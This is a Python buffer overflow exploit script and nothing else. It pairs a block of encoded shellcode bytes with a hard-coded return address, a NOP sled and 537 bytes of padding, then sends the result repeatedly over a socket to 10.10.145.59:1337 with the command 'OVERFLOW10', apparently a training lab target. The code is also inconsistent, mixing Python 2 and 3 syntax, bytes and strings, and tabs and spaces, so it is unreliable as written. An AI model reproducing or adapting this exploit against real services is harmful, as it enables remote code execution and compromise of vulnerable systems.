#!/usr/bin/python
import sys, socket
from time import sleep

buf =  b""
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x82\x6e\xc4\x38\x83\xee\xfc\xe2\xf4\x7e\x86"
buf += b"\x46\x38\x82\x6e\xa4\xb1\x67\x5f\x04\x5c\x09\x3e\xf4"
buf += b"\xb3\xd0\x62\x4f\x6a\x96\xe5\xb6\x10\x8d\xd9\x8e\x1e"
buf += b"\xb3\x91\x68\x04\xe3\x12\xc6\x14\xa2\xaf\x0b\x35\x83"
buf += b"\xa9\x26\xca\xd0\x39\x4f\x6a\x92\xe5\x8e\x04\x09\x22"
buf += b"\xd5\x40\x61\x26\xc5\xe9\xd3\xe5\x9d\x18\x83\xbd\x4f"
buf += b"\x71\x9a\x8d\xfe\x71\x09\x5a\x4f\x39\x54\x5f\x3b\x94"
buf += b"\x43\xa1\xc9\x39\x45\x56\x24\x4d\x74\x6d\xb9\xc0\xb9"
buf += b"\x13\xe0\x4d\x66\x36\x4f\x60\xa6\x6f\x17\x5e\x09\x62"
buf += b"\x8f\xb3\xda\x72\xc5\xeb\x09\x6a\x4f\x39\x52\xe7\x80"
buf += b"\x1c\xa6\x35\x9f\x59\xdb\x34\x95\xc7\x62\x31\x9b\x62"
buf += b"\x09\x7c\x2f\xb5\xdf\x06\xf7\x0a\x82\x6e\xac\x4f\xf1"
buf += b"\x5c\x9b\x6c\xea\x22\xb3\x1e\x85\x91\x11\x80\x12\x6f"
buf += b"\xc4\x38\xab\xaa\x90\x68\xea\x47\x44\x53\x82\x91\x11"
buf += b"\x68\xd2\x3e\x94\x78\xd2\x2e\x94\x50\x68\x61\x1b\xd8"
buf += b"\x7d\xbb\x53\x52\x87\x06\xce\x35\x81\x82\xac\x3a\x82"
buf += b"\x7f\x98\xb1\x64\x04\xd4\x6e\xd5\x06\x5d\x9d\xf6\x0f"
buf += b"\x3b\xed\x07\xae\xb0\x34\x7d\x20\xcc\x4d\x6e\x06\x34"
buf += b"\x8d\x20\x38\x3b\xed\xea\x0d\xa9\x5c\x82\xe7\x27\x6f"
buf += b"\xd5\x39\xf5\xce\xe8\x7c\x9d\x6e\x60\x93\xa2\xff\xc6"
buf += b"\x4a\xf8\x39\x83\xe3\x80\x1c\x92\xa8\xc4\x7c\xd6\x3e"
buf += b"\x92\x6e\xd4\x28\x92\x76\xd4\x38\x97\x6e\xea\x17\x08"
buf += b"\x07\x04\x91\x11\xb1\x62\x20\x92\x7e\x7d\x5e\xac\x30"
buf += b"\x05\x73\xa4\xc7\x57\xd5\x24\x25\xa8\x64\xac\x9e\x17"
buf += b"\xd3\x59\xc7\x57\x52\xc2\x44\x88\xee\x3f\xd8\xf7\x6b"
buf += b"\x7f\x7f\x91\x1c\xab\x52\x82\x3d\x3b\xed"

ret = '\xbb\x11\x50\x62'
nop = '\x90' * 32

buffer = "A" * 537 + ret + nop + buf

while True:
        try:
        	print('FUZZED WITH BUFFER SIZE OF ' + str(len(buffer)))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('10.10.145.59',1337))
                s.send(('OVERFLOW10 ' + buffer))
                s.recv(1024)
                s.close()
                sleep(1)
               

        except:
                print 'FUZZING crashed at %s bytes' % str(len(buffer))
                sys.exit()
